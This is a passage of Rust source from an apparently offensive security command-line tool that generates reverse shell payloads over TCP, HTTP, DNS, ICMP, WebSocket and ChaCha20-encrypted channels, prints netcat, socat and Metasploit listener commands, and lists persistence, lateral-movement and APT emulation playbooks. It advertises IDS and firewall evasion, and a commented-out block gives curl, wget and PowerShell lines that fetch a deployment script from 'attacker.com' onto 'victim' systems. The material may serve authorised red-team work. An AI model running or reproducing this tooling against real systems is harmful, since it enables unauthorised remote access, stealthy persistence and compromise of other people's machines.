        println!("  ‚Ä¢ Maximum reliability - tries multiple protocols");
        println!("  ‚Ä¢ Automatic fallback if one protocol fails");
        println!("  ‚Ä¢ TCP: Fastest (if not blocked)");
        println!("  ‚Ä¢ HTTP: 80% firewall bypass");
        println!("  ‚Ä¢ DNS: 99% firewall bypass (if domain configured)");
        println!("  ‚Ä¢ No persistent connection needed");

        println!("\n\x1b[1müöÄ How it works:\x1b[0m");
        println!("  1. Payload tries TCP first (port {}) - fastest", tcp_port);
        println!(
            "  2. If TCP fails ‚Üí tries HTTP (port {}) - firewall bypass",
            http_port
        );
        if domain.is_some() {
            println!("  3. If HTTP fails ‚Üí tries DNS tunneling - maximum bypass");
        } else {
            println!("  3. DNS disabled (no --domain provided)");
        }
        println!("  4. If all fail ‚Üí retry after 30 seconds");
        println!("  5. Ensures maximum success rate!");

        println!("\n\x1b[1müí° Tips:\x1b[0m");
        println!("  ‚Ä¢ Start all listeners before executing payload");
        println!("  ‚Ä¢ Payload will connect to whichever protocol succeeds first");
        println!("  ‚Ä¢ Add --domain for DNS fallback (requires domain ownership)");

        Ok(())
    }

    fn generate_encrypted_shell(&self, ctx: &CliContext) -> Result<(), String> {
        use crate::crypto::chacha20::{encode_base64, generate_key, generate_nonce};

        let shell_type = ctx.get_flag_or("type", "python");
        let (lhost, lport_num) = self.parse_host_port(ctx, "4444")?;

        // Generate or use provided key/nonce
        let key_b64 = if let Some(k) = ctx.get_flag("key") {
            k.clone()
        } else {
            let key = generate_key();
            encode_base64(&key)
        };

        let nonce_b64 = if let Some(n) = ctx.get_flag("nonce") {
            n.clone()
        } else {
            let nonce = generate_nonce();
            encode_base64(&nonce)
        };

        Output::header(&format!(
            "Encrypted Reverse Shell Generator (ChaCha20) - {}",
            shell_type
        ));

        let shell_type_enum = match shell_type.to_lowercase().as_str() {
            "bash" => ShellType::Bash,
            "python" | "py" => ShellType::Python,
            _ => {
                return Err(format!(
                    "Unknown shell type: {}. Available for encrypted shells: bash, python",
                    shell_type
                ))
            }
        };

        let payload =
            PayloadGenerator::generate_encrypted_shell(shell_type_enum, &key_b64, &nonce_b64);

        Output::item("Listener Host", &lhost);
        Output::item("Listener Port", &lport_num.to_string());
        Output::item("Shell Type", &shell_type);
        Output::item("Encryption", "ChaCha20-256 (RFC 7539)");
        Output::item("Key (base64)", &key_b64);
        Output::item("Nonce (base64)", &nonce_b64);

        println!("\n\x1b[1müìã Payload:\x1b[0m");
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));
        println!("{}", payload);
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));

        println!("\n\x1b[1müéß Start Listener:\x1b[0m");
        println!("  nc -lvnp {}", lport_num);
        println!("  OR");
        println!("  rb exploit payload listener --port {}", lport_num);

        println!("\n\x1b[1m‚ú® Advantages:\x1b[0m");
        println!("  ‚Ä¢ End-to-end encryption with ChaCha20 (256-bit key)");
        println!("  ‚Ä¢ Bypasses IDS/IPS signature detection (encrypted payload)");
        println!("  ‚Ä¢ No cleartext commands over network");
        println!("  ‚Ä¢ No cleartext output over network");
        println!("  ‚Ä¢ RFC 7539 - Battle-tested cipher (used in TLS, VPNs)");
        println!("  ‚Ä¢ Simpler than AES, equally secure");

        println!("\n\x1b[1m‚öôÔ∏è  How It Works:\x1b[0m");
        println!("  1. Payload connects to listener (encrypted TCP)");
        println!("  2. All commands are encrypted with ChaCha20 before transmission");
        println!("  3. All output is encrypted with ChaCha20 before transmission");
        println!("  4. Listener decrypts with same key/nonce");
        println!("  5. IDS/IPS sees only encrypted traffic!");

        println!("\n\x1b[1müîê Security Notes:\x1b[0m");
        println!("  ‚Ä¢ Keep key/nonce SECRET - anyone with them can decrypt traffic");
        println!("  ‚Ä¢ ChaCha20 is a stream cipher (symmetric encryption)");
        println!("  ‚Ä¢ Same key/nonce on both sides (payload and listener)");
        println!("  ‚Ä¢ Generate new key/nonce for each operation");

        println!("\n\x1b[1müí° Tips:\x1b[0m");
        println!("  ‚Ä¢ Save key/nonce to decrypt traffic later");
        println!("  ‚Ä¢ Use --key and --nonce flags to specify custom values");
        println!("  ‚Ä¢ Auto-generated if not provided");
        println!("  ‚Ä¢ For listener: implement ChaCha20 decryption on your side");

        println!("\n\x1b[1m‚ö†Ô∏è  Implementation Note:\x1b[0m");
        println!("  ‚Ä¢ Native encrypted listener coming soon!");
        println!("  ‚Ä¢ For now, you need to implement ChaCha20 decryption in your listener");
        println!("  ‚Ä¢ Python example: use pycryptodome or implement ChaCha20 from RFC 7539");
        println!("  ‚Ä¢ See payload source for embedded ChaCha20 implementation");

        Ok(())
    }

    fn generate_icmp_shell(&self, ctx: &CliContext) -> Result<(), String> {
        let shell_type = ctx.get_flag_or("type", "python");
        let (lhost, _) = self.parse_host_port(ctx, "0")?; // ICMP doesn't use ports, but parser needs default

        Output::header(&format!(
            "ICMP Reverse Shell Generator (Ping Tunneling) - {}",
            shell_type
        ));

        let config = PayloadConfig {
            lhost: lhost.clone(),
            lport: 0, // ICMP doesn't use ports
        };

        let shell_type_enum = match shell_type.to_lowercase().as_str() {
            "bash" => ShellType::Bash,
            "python" | "py" => ShellType::Python,
            "powershell" | "ps1" | "pwsh" => ShellType::PowerShell,
            _ => {
                return Err(format!(
                    "Unknown shell type: {}. Available for ICMP: bash, python, powershell",
                    shell_type
                ))
            }
        };

        let payload = PayloadGenerator::generate_icmp_reverse_shell(shell_type_enum, &config);

        Output::item("Listener Host", &lhost);
        Output::item("Shell Type", &shell_type);
        Output::item("Transport", "ICMP (Ping Tunneling)");
        Output::item("Firewall Bypass", "95% (ICMP rarely blocked)");

        println!("\n\x1b[1müìã Payload:\x1b[0m");
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));
        println!("{}", payload);
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));

        println!("\n\x1b[1müéß Start ICMP Listener:\x1b[0m");
        println!("  ‚ö†Ô∏è  ICMP listener not yet implemented in redblue");
        println!("  Use external tool for now:");
        println!("  ‚Ä¢ icmpsh (https://github.com/bdamele/icmpsh)");
        println!("  ‚Ä¢ prism (https://github.com/andreafabrizi/prism)");
        println!("  ‚Ä¢ ptunnel (http://www.cs.uit.no/~daniels/PingTunnel/)");

        println!("\n\x1b[1m‚ú® Advantages:\x1b[0m");
        println!("  ‚Ä¢ Bypasses 95% of firewalls (ICMP/ping rarely blocked)");
        println!("  ‚Ä¢ Works through most corporate firewalls");
        println!("  ‚Ä¢ No TCP/UDP ports needed");
        println!("  ‚Ä¢ Stealthy (looks like normal ping traffic)");
        println!("  ‚Ä¢ Works behind NAT/firewalls");

        println!("\n\x1b[1m‚öôÔ∏è  How It Works:\x1b[0m");
        println!("  1. Payload sends ICMP echo request with command request");
        println!("  2. Listener responds with ICMP echo reply containing command");
        println!("  3. Payload executes command");
        println!("  4. Payload sends output in ICMP echo request (chunked)");
        println!("  5. Process repeats - bidirectional communication over ping!");

        println!("\n\x1b[1m‚ö†Ô∏è  Requirements:\x1b[0m");
        println!("  ‚Ä¢ Payload requires root/sudo (raw ICMP sockets)");
        println!("  ‚Ä¢ Listener requires root/sudo (raw ICMP sockets)");
        println!("  ‚Ä¢ Both sides need ICMP access");
        println!("  ‚Ä¢ Target must be able to ping attacker IP");

        println!("\n\x1b[1müí° Tips:\x1b[0m");
        println!("  ‚Ä¢ Test with: ping {} (from target)", &lhost);
        println!("  ‚Ä¢ ICMP has ~1400 byte payload limit");
        println!("  ‚Ä¢ Output is chunked automatically");
        println!("  ‚Ä¢ Session ID tracks multiple connections");

        println!("\n\x1b[1müîß Manual Listener (Python):\x1b[0m");
        println!(
            r#"  sudo python3 -c "
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
sock.bind(('0.0.0.0', 0))
while True:
    data, addr = sock.recvfrom(1024)
    print(f'ICMP from {{addr}}: {{data[28:]}}')  # Skip IP+ICMP headers
"
"#
        );

        Ok(())
    }

    fn generate_websocket_shell(&self, ctx: &CliContext) -> Result<(), String> {
        let shell_type = ctx.get_flag_or("type", "python");
        let (lhost, lport_num) = self.parse_host_port(ctx, "8080")?;

        Output::header(&format!(
            "WebSocket Reverse Shell Generator (RFC 6455) - {}",
            shell_type
        ));

        let config = PayloadConfig {
            lhost: lhost.clone(),
            lport: lport_num,
        };

        let shell_type_enum = match shell_type.to_lowercase().as_str() {
            "python" | "py" => ShellType::Python,
            "node" | "nodejs" | "js" => ShellType::Node,
            "powershell" | "ps1" | "pwsh" => ShellType::PowerShell,
            _ => {
                return Err(format!(
                    "Unknown shell type: {}. Available for WebSocket: python, node, powershell",
                    shell_type
                ))
            }
        };

        let payload = PayloadGenerator::generate_websocket_reverse_shell(shell_type_enum, &config);

        Output::item("Listener Host", &lhost);
        Output::item("Listener Port", &lport_num.to_string());
        Output::item("Shell Type", &shell_type);
        Output::item("Transport", "WebSocket (RFC 6455)");
        Output::item("Firewall Bypass", "99% (HTTP/HTTPS ports)");

        println!("\n\x1b[1müìã Payload:\x1b[0m");
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));
        println!("{}", payload);
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));

        println!("\n\x1b[1müéß Start WebSocket Listener:\x1b[0m");
        println!("  ‚úÖ Native WebSocket listener - NO external tools needed!");
        println!(
            "  rb exploit payload start --port {} --listener-type websocket",
            lport_num
        );
        println!("\n  OR use external tools:");
        println!("  ‚Ä¢ wscat (npm install -g wscat)");
        println!("  ‚Ä¢ websocat (https://github.com/vi/websocat)");

        println!("\n\x1b[1m‚ú® Advantages:\x1b[0m");
        println!("  ‚Ä¢ Bypasses 99% of firewalls (uses HTTP/HTTPS ports 80/443)");
        println!("  ‚Ä¢ Works through HTTP proxies");
        println!("  ‚Ä¢ Persistent bidirectional connection");
        println!("  ‚Ä¢ No polling needed (real-time)");
        println!("  ‚Ä¢ Looks like legitimate web application traffic");
        println!("  ‚Ä¢ Supports binary data transfer");

        println!("\n\x1b[1m‚öôÔ∏è  How It Works:\x1b[0m");
        println!("  1. Payload performs WebSocket handshake (HTTP Upgrade)");
        println!("  2. Connection upgraded to WebSocket protocol");
        println!("  3. Commands sent as WebSocket text frames");
        println!("  4. Output returned as WebSocket text frames");
        println!("  5. Persistent connection - no reconnection overhead!");

        println!("\n\x1b[1m‚ö†Ô∏è  Requirements:\x1b[0m");
        println!("  ‚Ä¢ Port {} must be accessible from target", lport_num);
        println!("  ‚Ä¢ Firewall allows HTTP/HTTPS traffic");
        println!("  ‚Ä¢ WebSocket listener on attacker machine");

        println!("\n\x1b[1müí° Tips:\x1b[0m");
        println!("  ‚Ä¢ Use port 80 or 443 for maximum bypass");
        println!("  ‚Ä¢ Add TLS for encrypted WebSocket (wss://)");
        println!("  ‚Ä¢ WebSocket frames support up to 2^63 bytes");
        println!("  ‚Ä¢ No chunking needed - protocol handles it");

        println!("\n\x1b[1müîß Simple WebSocket Listener (Python):\x1b[0m");
        println!(
            r#"  sudo python3 -c "
import socket, hashlib, base64

def ws_handshake(client):
    req = client.recv(1024).decode()
    key = [l for l in req.split('\r\n') if 'Sec-WebSocket-Key' in l][0].split(':')[1].strip()
    magic = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11'
    accept = base64.b64encode(hashlib.sha1((key + magic).encode()).digest()).decode()
    response = f'HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: {{accept}}\r\n\r\n'
    client.send(response.encode())

s = socket.socket()
s.bind(('0.0.0.0', {}))
s.listen(1)
print('[*] WebSocket listener on port {}')
c, a = s.accept()
print(f'[+] Connection from {{a}}')
ws_handshake(c)
print('[+] WebSocket handshake complete')
while True:
    # Receive and decode WebSocket frames here
    data = c.recv(4096)
    if not data: break
    print(f'Received: {{data}}')
"
"#,
            lport_num, lport_num
        );

        println!("\n\x1b[1müöÄ Quick Start with wscat:\x1b[0m");
        println!("  npm install -g wscat");
        println!("  wscat -l {}", lport_num);
        println!("  # Execute payload on target");
        println!("  # Type commands in wscat terminal");

        Ok(())
    }

    fn generate_listener(&self, ctx: &CliContext) -> Result<(), String> {
        let port = ctx.get_flag_or("port", "4444");
        let use_ssl = ctx.has_flag("ssl");

        Output::header("Listener Commands");
        Output::item("Port", &port);

        println!("\n\x1b[1müéß Start Listener:\x1b[0m\n");

        println!("\x1b[1m1. Netcat (Traditional):\x1b[0m");
        println!("   nc -lvnp {}", port);

        println!("\n\x1b[1m2. Netcat (OpenBSD):\x1b[0m");
        println!("   nc -lvp {}", port);

        println!("\n\x1b[1m3. Ncat (Nmap):\x1b[0m");
        println!("   ncat -lvnp {}", port);

        if use_ssl {
            println!("\n\x1b[1m4. Socat with SSL:\x1b[0m");
            println!("   # Generate certificate:");
            println!("   openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt");
            println!("   cat shell.key shell.crt > shell.pem");
            println!("\n   # Start listener:");
            println!(
                "   socat OPENSSL-LISTEN:{},cert=shell.pem,verify=0 STDOUT",
                port
            );
        } else {
            println!("\n\x1b[1m4. Socat:\x1b[0m");
            println!("   socat TCP-LISTEN:{},reuseaddr,fork STDOUT", port);
        }

        println!("\n\x1b[1m5. Metasploit:\x1b[0m");
        println!("   msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT {}; run\"", port);

        println!("\n\x1b[1m6. PowerShell (Windows):\x1b[0m");
        println!(
            "   $listener = [System.Net.Sockets.TcpListener]{};$listener.start();$client = $listener.AcceptTcpClient();",
            port
        );

        Ok(())
    }

    fn show_lateral_movement(&self, ctx: &CliContext) -> Result<(), String> {
        let technique = ctx.target.as_deref();

        Output::header("Lateral Movement Techniques");

        let commands = LateralMovementScanner::generate_movement_commands();

        if let Some(tech) = technique {
            if let Some(cmd) = commands.get(tech) {
                Output::item("Technique", tech);
                println!("\n{}", cmd);
                return Ok(());
            } else {
                Output::error(&format!("Unknown technique: {}", tech));
                println!("\nAvailable techniques:");
            }
        }

        println!("\n\x1b[1mAvailable Techniques:\x1b[0m\n");

        let techniques = vec![
            ("ssh_key_reuse", "üîë SSH Key Reuse"),
            ("ssh_tunneling", "üåê SSH Tunneling & Port Forwarding"),
            ("psexec", "üíª PsExec (Windows)"),
            ("wmiexec", "‚öôÔ∏è  WMI Execution (Windows)"),
            ("pass_the_hash", "üîê Pass-the-Hash (Windows)"),
            ("smb_relay", "üîÑ SMB Relay Attack"),
            ("nfs_mount", "üìÅ NFS Mount Exploitation"),
            ("rsync_abuse", "üì¶ Rsync Abuse"),
            ("password_spraying", "üåßÔ∏è  Password Spraying"),
            ("metasploit_pivot", "üîÄ Metasploit Pivoting"),
            ("chisel_tunnel", "üîß Chisel Tunneling"),
        ];

        for (key, desc) in techniques {
            println!("  {}", desc);
            println!("    \x1b[2mrb exploit payload lateral {}\x1b[0m\n", key);
        }

        println!("\n\x1b[1mWorks alongside:\x1b[0m");
        println!("  ‚Ä¢ CrackMapExec - Credential spraying");
        println!("  ‚Ä¢ BloodHound - Active Directory enumeration");
        println!("  ‚Ä¢ Impacket - SMB/WMI tools");
        println!("  ‚Ä¢ Metasploit - Pivoting framework");

        Ok(())
    }

    fn show_persistence(&self, ctx: &CliContext) -> Result<(), String> {
        let mechanism = ctx.target.as_deref();

        Output::header("Persistence Mechanisms");

        let commands = PersistenceMechanism::generate_persistence_commands();

        if let Some(mech) = mechanism {
            if let Some(cmd) = commands.get(mech) {
                Output::item("Mechanism", mech);
                println!("\n{}", cmd);
                return Ok(());
            } else {
                Output::error(&format!("Unknown mechanism: {}", mech));
                println!("\nAvailable mechanisms:");
            }
        }

        println!("\n\x1b[1müêß Linux Persistence:\x1b[0m\n");

        let linux_mechanisms = vec![
            ("cron_persistence", "‚è∞ Cron Job Persistence"),
            ("ssh_key_persistence", "üîë SSH Authorized Keys"),
            ("systemd_service", "‚öôÔ∏è  systemd Service"),
            ("bashrc_persistence", "üìù .bashrc/.profile Injection"),
        ];

        for (key, desc) in linux_mechanisms {
            println!("  {}", desc);
            println!("    \x1b[2mrb exploit payload persist {}\x1b[0m\n", key);
        }

        println!("\x1b[1mü™ü Windows Persistence:\x1b[0m\n");

        let windows_mechanisms = vec![
            ("registry_run_key", "üìã Registry Run Keys"),
            ("scheduled_task", "‚è∞ Scheduled Tasks"),
            ("wmi_persistence", "‚öôÔ∏è  WMI Event Subscriptions"),
            ("sticky_keys", "üîê Sticky Keys Backdoor"),
        ];

        for (key, desc) in windows_mechanisms {
            println!("  {}", desc);
            println!("    \x1b[2mrb exploit payload persist {}\x1b[0m\n", key);
        }

        println!("\n\x1b[1m‚ö†Ô∏è  Detection Risk:\x1b[0m");
        println!("  ‚Ä¢ Cron/Scheduled Tasks: MEDIUM (visible in cron/task list)");
        println!("  ‚Ä¢ SSH Keys: LOW (requires checking authorized_keys)");
        println!("  ‚Ä¢ systemd/Registry: MEDIUM (visible in service/registry list)");
        println!("  ‚Ä¢ WMI Subscriptions: HIGH (advanced defenders check WMI)");
        println!("  ‚Ä¢ Sticky Keys: CRITICAL (easily detected, requires reboot)");

        Ok(())
    }

    fn start_listener(&self, ctx: &CliContext) -> Result<(), String> {
        let port = ctx.get_flag_or("port", "4444");
        let port_num: u16 = port
            .parse()
            .map_err(|_| format!("Invalid port: {}", port))?;

        let listener_type = ctx.get_flag_or("listener-type", "tcp");

        match listener_type.to_lowercase().as_str() {
            "tcp" => {
                Output::header("Native TCP Listener");
                Output::item("Port", &port);
                Output::item("Type", "TCP");
                println!();

                println!("\x1b[1müéß Starting TCP listener...\x1b[0m");
                println!("  ‚Ä¢ Press Ctrl+C to stop");
                println!("  ‚Ä¢ Waiting for reverse shell connections");
                println!("  ‚Ä¢ Sessions will be tracked automatically\n");

                let listener = ExploitListener::new_tcp(port_num);
                listener.start()
            }
            "http" => {
                Output::header("Native HTTP Listener");
                Output::item("Port", &port);
                Output::item("Type", "HTTP");
                println!();

                println!("\x1b[1müéß Starting HTTP listener...\x1b[0m");
                println!("  ‚Ä¢ Press Ctrl+C to stop");
                println!("  ‚Ä¢ Waiting for HTTP reverse shell connections");
                println!("  ‚Ä¢ Sessions will be tracked automatically");
                println!("  ‚Ä¢ Bypasses most firewalls (HTTP traffic allowed)\n");

                let listener = ExploitListener::new_http(port_num);
                listener.start()
            }
            "dns" => {
                Output::header("Native DNS Listener (DNS Tunneling)");
                Output::item("Port", &port);
                Output::item("Type", "DNS (Tunneling)");
                println!();

                println!("\x1b[1müéß Starting DNS listener...\x1b[0m");
                println!("  ‚Ä¢ Press Ctrl+C to stop");
                println!("  ‚Ä¢ Waiting for DNS tunneling reverse shell connections");
                println!("  ‚Ä¢ Sessions will be tracked automatically");
                println!("  ‚Ä¢ Bypasses 99% of firewalls (DNS NEVER blocked!)");
                println!("  ‚Ä¢ ‚ö†Ô∏è  Requires root/sudo (port 53)\n");

                if port_num != 53 {
                    println!("\x1b[33m‚ö†Ô∏è  Warning: DNS typically uses port 53\x1b[0m");
                    println!("  Current port: {}", port_num);
                    println!("  Consider using: sudo rb exploit payload start --port 53 --listener-type dns\n");
                }

                let listener = ExploitListener::new_dns(port_num);
                listener.start()
            }
            "websocket" => {
                Output::header("Native WebSocket Listener (RFC 6455)");
                Output::item("Port", &port);
                Output::item("Type", "WebSocket");
                println!();

                println!("\x1b[1müéß Starting WebSocket listener...\x1b[0m");
                println!("  ‚Ä¢ Press Ctrl+C to stop");
                println!("  ‚Ä¢ Waiting for WebSocket reverse shell connections");
                println!("  ‚Ä¢ Sessions will be tracked automatically");
                println!("  ‚Ä¢ Bypasses 99% of firewalls (HTTP/HTTPS ports allowed!)");
                println!("  ‚Ä¢ Native implementation - NO external tools needed!\n");

                if port_num == 80 || port_num == 443 {
                    println!("\x1b[32m‚úÖ Using standard HTTP/HTTPS port - maximum firewall bypass!\x1b[0m\n");
                }

                let listener = ExploitListener::new_websocket(port_num);
                listener.start()
            }
            _ => Err(format!(
                "Unknown listener type: {}. Use: tcp, http, dns, or websocket",
                listener_type
            )),
        }
    }

    fn list_sessions(&self, ctx: &CliContext) -> Result<(), String> {
        Output::header("Active Reverse Shell Sessions");

        // TODO: This needs a global session manager
        // For now, we'll show a message
        println!("\n\x1b[33m‚ö†Ô∏è  Session management requires running listener\x1b[0m\n");

        println!("To start a listener and track sessions:");
        println!("  rb exploit payload start --port 4444\n");

        println!("Once connected, sessions will be displayed with:");
        println!("  ‚Ä¢ Session ID");
        println!("  ‚Ä¢ Remote IP:Port");
        println!("  ‚Ä¢ Connection time");
        println!("  ‚Ä¢ Session type (tcp-reverse, http-reverse, etc.)");

        Ok(())
    }

    /// Generate self-replication deployment script
    fn generate_self_replicate(&self, _ctx: &CliContext) -> Result<(), String> {
        // use crate::modules::exploit::self_replicate::SelfReplicator;

        Output::header("üîÑ Self-Replication Deployment Script Generator");
        Output::warning("‚ö†Ô∏è  TODO: self_replicate module needs to be implemented");
        return Err("Feature not yet implemented".to_string());

        /*
        Output::warning("‚ö†Ô∏è  AUTHORIZED USE ONLY - Deploy rb binary to victim systems");

        // Get flags
        let target_os = ctx.get_flag_or("os", "linux");
        let persistence = ctx.has_flag("persist");
        let output_file = ctx.get_flag("output").map(|s| s.to_string());

        Output::info(&format!("Target OS: {}", target_os));
        Output::info(&format!(
            "Persistence: {}",
            if persistence { "ENABLED" } else { "disabled" }
        ));

        // Create replicator
        Output::spinner_start("Extracting current binary");
        let mut replicator = SelfReplicator::new()?;
        replicator = replicator.with_os(&target_os).with_persistence(persistence);

        let binary_size = replicator.binary_size()?;
        Output::spinner_done();

        Output::item(
            "Binary path",
            replicator.binary_path().display().to_string().as_str(),
        );
        Output::item(
            "Binary size",
            &format!(
                "{} bytes ({:.2} KB)",
                binary_size,
                binary_size as f64 / 1024.0
            ),
        );

        // Extract and encode binary
        Output::spinner_start("Encoding binary as base64");
        replicator.extract_binary()?;
        Output::spinner_done();

        // Generate deployment script
        Output::spinner_start("Generating deployment script");
        let script = replicator.generate_script()?;
        Output::spinner_done();

        // Save or display
        if let Some(output_path) = output_file {
            Output::spinner_start(&format!("Saving to {}", output_path));
            replicator.save_script(&output_path)?;
            Output::spinner_done();

            Output::success(&format!("‚úÖ Deployment script saved to: {}", output_path));

            // Make executable on Unix
            #[cfg(unix)]
            Output::info("Script is executable (chmod +x applied)");

            println!();
            Output::header("üìã Usage Instructions");
            println!("\n1. Transfer script to victim:");
            match target_os.as_str() {
                "windows" => {
                    println!("   powershell -Command \"Invoke-WebRequest -Uri http://attacker.com/{} -OutFile deploy.ps1\"", output_path);
                    println!();
                    println!("2. Execute on victim:");
                    println!("   powershell -ExecutionPolicy Bypass -File deploy.ps1");
                }
                _ => {
                    println!("   curl http://attacker.com/{} -o deploy.sh", output_path);
                    println!("   wget http://attacker.com/{}", output_path);
                    println!();
                    println!("2. Execute on victim:");
                    println!("   bash {}", output_path);
                    println!("   chmod +x {} && ./{}", output_path, output_path);
                }
            }

            if persistence {
                println!();
                Output::info("üîí Persistence mechanisms will be installed automatically");
            }
        } else {
            // Display to stdout
            println!();
            Output::header("üìÑ Deployment Script");
            println!("\n{}", script);
            println!();
            Output::info("üí° Tip: Save to file with --output flag");
            println!(
                "   rb exploit payload replicate --os {} --output deploy.sh",
                target_os
            );
        }
        */

        // Ok(())
    }

    /// List all available playbooks (standard + APT)
    fn list_playbooks(&self, ctx: &CliContext) -> Result<(), String> {
        let apt_only = ctx.has_flag("apt");

        if apt_only {
            return self.list_apt_playbooks(ctx);
        }

        Output::header("Available Playbooks");

        // Standard playbooks
        println!();
        println!("\x1b[1;36müìã Standard Playbooks (11 operational playbooks)\x1b[0m");
        println!();

        for playbook in all_playbooks() {
            let risk_color = match playbook.metadata.risk_level {
                crate::playbooks::RiskLevel::Critical => "\x1b[1;31m",
                crate::playbooks::RiskLevel::High => "\x1b[31m",
                crate::playbooks::RiskLevel::Medium => "\x1b[33m",
                crate::playbooks::RiskLevel::Low => "\x1b[32m",
                crate::playbooks::RiskLevel::Passive => "\x1b[36m",
            };
            println!("  \x1b[1m{}\x1b[0m", playbook.metadata.id);
            println!(
                "    {} ‚Ä¢ Risk: {}{:?}\x1b[0m ‚Ä¢ {} steps",
                playbook.metadata.name,
                risk_color,
                playbook.metadata.risk_level,
                playbook.steps.len()
            );
        }

        // APT playbooks
        println!();
        println!(
            "\x1b[1;35müé≠ APT Adversary Emulation Playbooks (15 threat actor profiles)\x1b[0m"
        );
        println!();

        for (id, name) in list_apt_groups() {
            println!("  \x1b[1m{}\x1b[0m - {}", id, name);
        }

        println!();
        Output::info("View APT playbook details: rb exploit payload apt <group-id>");
        Output::info("Run playbook: rb exploit payload run <playbook-id> <target>");

        Ok(())
    }

    /// List APT adversary emulation playbooks
    fn list_apt_playbooks(&self, ctx: &CliContext) -> Result<(), String> {
        let group_id = ctx.target.as_ref();

        if let Some(id) = group_id {
            // Show specific APT playbook details
            let playbook = get_apt_playbook(id)
                .ok_or_else(|| format!("APT playbook '{}' not found. Use 'rb exploit payload apt' to list available groups.", id))?;

            Output::header(&format!("APT Playbook: {}", playbook.metadata.name));
            println!();

            Output::item("ID", &playbook.metadata.id);
            Output::item("Objective", &playbook.metadata.objective);
            Output::item("Risk Level", playbook.metadata.risk_level.as_str());
            Output::item("Steps", &playbook.steps.len().to_string());

            // Show pre-conditions
            if !playbook.preconditions.is_empty() {
                println!();
                println!("\x1b[1;33m‚ö° Pre-conditions:\x1b[0m");
                for cond in &playbook.preconditions {
                    println!("  ‚Ä¢ {}", cond.description);
                }
            }

            // Show attack flow
            println!();
            println!("\x1b[1;36müéØ Attack Flow:\x1b[0m");
            for step in &playbook.steps {
                let phase_color = match step.phase {
                    crate::playbooks::PlaybookPhase::InitialAccess => "\x1b[31m",
                    crate::playbooks::PlaybookPhase::Execution => "\x1b[33m",
                    crate::playbooks::PlaybookPhase::Persistence => "\x1b[35m",
                    crate::playbooks::PlaybookPhase::PrivilegeEscalation => "\x1b[1;31m",
                    crate::playbooks::PlaybookPhase::DefenseEvasion => "\x1b[36m",
                    crate::playbooks::PlaybookPhase::CredentialAccess => "\x1b[1;33m",
                    crate::playbooks::PlaybookPhase::Discovery => "\x1b[34m",
                    crate::playbooks::PlaybookPhase::LateralMovement => "\x1b[1;35m",
                    crate::playbooks::PlaybookPhase::Collection => "\x1b[32m",
                    crate::playbooks::PlaybookPhase::C2 => "\x1b[1;36m",
                    crate::playbooks::PlaybookPhase::Exfiltration => "\x1b[1;32m",
                    crate::playbooks::PlaybookPhase::Impact => "\x1b[1;31m",
                    _ => "\x1b[0m",
                };

                println!();
                println!(
                    "  \x1b[1m{}. {}\x1b[0m {}[{}]\x1b[0m",
                    step.number,
                    step.name,
                    phase_color,
                    step.phase.as_str()
                );
                println!("     {}", step.description);

                if let Some(technique) = &step.mitre_technique {
                    println!("     MITRE: \x1b[2m{}\x1b[0m", technique);
                }
            }

            // Show evidence
            if !playbook.evidence.is_empty() {
                println!();
                println!("\x1b[1;32m‚úì Evidence of Success:\x1b[0m");
                for ev in &playbook.evidence {
                    println!("  ‚Ä¢ {}", ev.description);
                }
            }

            // Show failed controls
            if !playbook.failed_controls.is_empty() {
                println!();
                println!("\x1b[1;31m‚úó Failed Controls (Common Defensive Gaps):\x1b[0m");
                for ctrl in &playbook.failed_controls {
                    println!("  ‚Ä¢ {} - {}", ctrl.name, ctrl.reason);
                }
            }

            println!();
            Output::info(&format!(
                "Run this playbook: rb exploit payload run {} <target>",
                id
            ));
        } else {
            // List all APT groups
            Output::header("APT Adversary Emulation Playbooks");
            println!();
            println!("Based on MITRE ATT&CK v18.1 threat actor profiles.");
            println!("These playbooks emulate real-world APT group TTPs.");
            println!();

            println!("\x1b[1;31müá∑üá∫ Russia\x1b[0m");
            println!("  apt28    - Fancy Bear (GRU Unit 26165)");
            println!("  apt29    - Cozy Bear (SVR)");
            println!("  sandworm-team - BlackEnergy (GRU Unit 74455)");
            println!("  turla    - Waterbug (FSB)");
            println!("  wizard-spider - TrickBot/Ryuk");
            println!();

            println!("\x1b[1;33müá®üá≥ China\x1b[0m");
            println!("  apt3     - Gothic Panda (MSS)");
            println!("  apt41    - Wicked Panda (MSS contractor)");
            println!("  volt-typhoon - BRONZE SILHOUETTE (PLA)");
            println!();

            println!("\x1b[1;34müá∞üáµ North Korea\x1b[0m");
            println!("  kimsuky  - Velvet Chollima (RGB)");
            println!("  lazarus-group - HIDDEN COBRA (RGB)");
            println!();

            println!("\x1b[1;32müáÆüá∑ Iran\x1b[0m");
            println!("  muddywater - MOIS");
            println!("  oilrig   - APT34 (MOIS)");
            println!();

            println!("\x1b[1;35müáªüá≥ Vietnam\x1b[0m");
            println!("  apt32    - OceanLotus");
            println!();

            println!("\x1b[1;36müí∞ Financially Motivated\x1b[0m");
            println!("  fin7     - Carbanak");
            println!("  scattered-spider - Social Engineering Experts");
            println!();

            Output::info("View playbook details: rb exploit payload apt <group-id>");
            Output::info("Example: rb exploit payload apt apt29");
        }

        Ok(())
    }
}
